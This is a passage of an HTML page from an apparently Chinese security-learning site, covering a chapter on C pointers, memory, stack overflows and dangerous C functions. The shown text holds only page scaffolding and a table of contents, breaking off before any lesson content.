@@ -1,0 +1,2856 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="从零开始的网络空间安全学习笔记">
+      
+      
+        <meta name="author" content="我自己">
+      
+      
+        <link rel="canonical" href="https://king-sw-0106.github.io/security-kb/01-C%E8%AF%AD%E8%A8%80-%E6%8C%87%E9%92%88%E4%B8%8E%E5%86%85%E5%AD%98/">
+      
+      
+        <link rel="prev" href="../00-%E7%9B%AE%E5%BD%95%E4%B8%8E%E8%BF%9B%E5%BA%A6/">
+      
+      
+        <link rel="next" href="../02-Python-%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E9%80%9F%E9%80%9A/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>🔴 层0-A C语言指针与内存 - 网安知识库</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#01-c" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href=".." title="网安知识库" class="md-header__button md-logo" aria-label="网安知识库" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            网安知识库
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              🔴 层0-A C语言指针与内存
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换暗色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换暗色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换亮色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换亮色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="网安知识库" class="md-nav__button md-logo" aria-label="网安知识库" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    网安知识库
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🏠 起点
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../00-%E7%9B%AE%E5%BD%95%E4%B8%8E%E8%BF%9B%E5%BA%A6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📊 目录与进度
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔴 层0-A C语言指针与内存
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔴 层0-A C语言指针与内存
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚪 门前检查
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📊 本章进度
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. 内存到底是什么？
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. 内存到底是什么？">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：图书馆的存包柜
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 技术原理
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💻 动手写代码
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧪 小实验
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚠️ 常见误区
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. 指针——存地址的变量
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. 指针——存地址的变量">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：快递单上的收件地址
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 技术原理
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💻 动手写代码
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧪 小实验
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚠️ 常见误区
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. 数组和指针——其实是一回事
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="3. 数组和指针——其实是一回事">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：街道门牌号系统
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 技术原理
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        图解：数组在内存中的布局
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💻 动手写代码
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧪 小实验
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚠️ 常见误区
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-stackheap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. 📌 栈（Stack）和堆（Heap）——程序的两种内存
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. 📌 栈（Stack）和堆（Heap）——程序的两种内存">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：餐厅洗盘子 vs 仓库取货
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 技术原理：栈帧结构
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔥 关键洞察：为什么栈溢出能控制程序？
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💻 动手写代码：一个故意栈溢出的程序
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧪 小实验
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. 📌 网安必知的几个危险函数
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. 📌 网安必知的几个危险函数">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_23" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：不看刻度线的杯子
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_24" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 头号通缉犯完整档案
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="💣 头号通缉犯完整档案">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-gets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. gets() —— 永远的罪魁祸首
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-strcpy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. strcpy() —— 最常用的地雷
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-strcat" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. strcat() —— 拼接时溢出
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-sprintf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. sprintf() —— 格式化溢出
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-scanfs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. scanf("%s") —— 默认不限制
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_25" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛡️ 记住一条规律
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_26" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💻 双栏对比：每种函数的"被黑"版本和"安全"版本
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_27" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚠️ 常见误区
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-gdb-20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. GDB 调试——20 分钟上手
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6. GDB 调试——20 分钟上手">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_28" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：给程序装监控摄像头
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_29" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 安装和启动
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gdb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💻 GDB 核心命令实操
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#gdb_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧪 小实验：用 GDB 看看栈上的"返回地址"
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-gdb" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. 🧪 综合实验：用 GDB 观察栈溢出
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7. 🧪 综合实验：用 GDB 观察栈溢出">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_30" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实验准备
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_31" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实验步骤
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_32" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        实验报告（写在你自己的笔记里）
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. 自己写一个内存查看器
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_33" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧵 实际案例串联
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🧵 实际案例串联">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#12001-code-red" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        案例 1：2001 年 Code Red 蠕虫
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#22014-heartbleed" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        案例 2：2014 年 Heartbleed（心脏滴血）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-app" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        案例 3：你手机上的每个 App
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_34" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📝 复习自检
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_35" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎬 推荐视频
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_36" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔗 知识串联
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔗 知识串联">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#02-python-md" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        下一步：打开 02-Python-安全工具速通.md
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../02-Python-%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E9%80%9F%E9%80%9A/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔴 层0-B Python安全工具
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../03-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB-%E7%A8%8B%E5%BA%8F%E5%A6%82%E4%BD%95%E8%BF%90%E8%A1%8C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔴 层1 计算机体系
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../04-%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE-%E6%95%B0%E6%8D%AE%E5%A6%82%E4%BD%95%E4%BC%A0%E8%BE%93/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🔴 层2 网络协议
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../05-%E5%AF%86%E7%A0%81%E5%AD%A6-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🟡 层3-A 密码学
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../06-Web%E5%AE%89%E5%85%A8-%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E5%BE%A1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🟡 层3-B Web安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../07-%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🟡 层3-C 二进制安全
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../08-%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98-%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%88%B0%E6%8F%90%E6%9D%83/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🟢 层4 渗透实战
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚪 门前检查
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📊 本章进度
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. 内存到底是什么？
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. 内存到底是什么？">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🏪 生活场景：图书馆的存包柜
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 技术原理
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💻 动手写代码
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
